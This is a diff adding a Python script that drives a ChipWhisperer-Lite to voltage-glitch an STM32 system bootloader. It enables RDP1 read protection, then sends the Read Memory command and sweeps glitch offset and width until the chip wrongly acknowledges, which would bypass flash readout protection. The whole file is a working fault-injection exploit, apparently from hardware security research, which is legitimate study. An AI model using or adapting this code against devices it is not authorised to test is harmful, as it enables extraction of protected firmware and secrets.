@@ -1,0 +1,143 @@
+import chipwhisperer as cw
+import time
+
+# Your CW-Lite serial
+CW_SERIAL = "442031204c5032433130333234313031"
+
+scope = None
+target = None
+stm32 = None
+
+
+def connect():
+    global scope, target, stm32
+
+    print("[*] Connecting to ChipWhisperer-Lite...")
+    scope = cw.scope(sn=CW_SERIAL)
+    scope.default_setup()
+
+    target = cw.target(scope)
+
+    prog = cw.programmers.STM32FProgrammer()
+    prog.scope = scope
+    stm32 = prog.stm32prog()
+    stm32.scope = scope
+
+    # Voltage glitch setup on CW-Lite
+    scope.vglitch_setup("lp")           # config HP/LP, clkgen, glitch_only, etc.
+    scope.glitch.trigger_src = "manual" # we use manual trigger (bottom left of diagram)
+    scope.glitch.clk_src     = "clkgen" # use clkgen as glitch clock
+    scope.glitch.repeat      = 1
+
+    # We will sweep these two later:
+    scope.glitch.ext_offset = 0         # coarse delay in glitch cycles
+    scope.glitch.width      = 5         # glitch width in glitch cycles
+
+    print("[*] Glitch block ready (manual trigger, ext_offset + width will be swept).")
+
+
+def enter_bootloader():
+    """Enter ROM bootloader and sync (0x7F -> 0x79)."""
+    stm32.set_boot(True)        # BOOT0 = 1 -> system memory
+    stm32.reset()
+    stm32.open_port(baud=9600)
+    target.flush()
+
+    target.write('\x7F')
+    resp = target.read(1)
+    if resp != '\x79':
+        raise RuntimeError(f"Bootloader sync failed, got {repr(resp)}")
+
+
+def enable_rdp1():
+    """Enable RDP1 once (0x82 + 0x7D)."""
+    print("[*] Enabling RDP1...")
+    target.write('\x82')
+    target.write('\x7D')
+
+    ack1 = target.read(1)
+    ack2 = target.read(1)
+    print("    RDP enable ACKs:", repr(ack1), repr(ack2))
+    time.sleep(0.1)   # chip resets
+
+
+def try_glitch_once(ext_offset, width):
+    """
+    One attempt to glitch FUN_1ffff520_read_memory_get_address().
+
+    Under RDP1 and the code you showed:
+      - Bootloader calls check_RDP1
+      - Because RDP is set, it RETURNS 0x55555555 WITHOUT sending ACK (0x79)
+
+    We want a fault where this function behaves as if RDP is NOT set
+    and sends ACK (0x79). So we:
+
+      1) send 0x11 0xEE
+      2) immediately call manual_trigger()
+      3) hardware waits ext_offset cycles, then fires glitch (width cycles)
+      4) we read the next byte:
+         SUCCESS if it is 0x79 instead of 0x1F / timeout.
+    """
+    scope.glitch.ext_offset = ext_offset
+    scope.glitch.width      = width
+
+    # Fresh bootloader session (RDP1 already active)
+    enter_bootloader()
+
+    # Send Read Memory command + complement
+    target.write('\x11')
+    target.write('\xEE')
+
+    # Trigger the glitch block now; ext_offset will delay it in hardware
+    scope.glitch.manual_trigger()
+
+    # Next byte is the one sent inside FUN_1ffff520_read_memory_get_address:
+    #   - ACK (0x79) if RDP is seen as 0
+    #   - nothing / NACK (0x1F) if RDP1 blocks it.
+    resp = target.read(1)
+
+    if resp == '\x79':
+        print(f"    >>> GOT ACK 0x79 under RDP1! ext_offset={ext_offset}, width={width}")
+        return True
+
+    print(f"    Got {repr(resp)} (expected NACK under RDP1).")
+    return False
+
+
+def main():
+    connect()
+
+    # Put device in bootloader with RDP0, then enable RDP1 once
+    enter_bootloader()
+    enable_rdp1()
+    print("[*] RDP1 should now be active. Starting glitch sweep...")
+
+    found = False
+
+    # Typical ranges people use on CW-Lite:
+    EXT_OFFSETS = range(0, 400, 1)   # coarse delay in glitch cycles
+    WIDTHS      = range(1, 11, 1)     # glitch width in glitch cycles
+
+    for ext in EXT_OFFSETS:
+        for w in WIDTHS:
+            print(f"\n[*] Trying ext_offset={ext}, width={w}")
+            try:
+                if try_glitch_once(ext, w):
+                    print("\n[***] SUCCESS CANDIDATE ***")
+                    print(f"      ext_offset = {ext}")
+                    print(f"      width      = {w}")
+                    found = True
+                    break
+            except Exception as e:
+                print("    Error during attempt:", e)
+                time.sleep(0.05)
+        if found:
+            break
+
+    if not found:
+        print("\n[!] No successful glitch found in this range.")
+        print("    Change EXT_OFFSETS / WIDTHS and run again.")
+
+
+if __name__ == "__main__":
+    main()
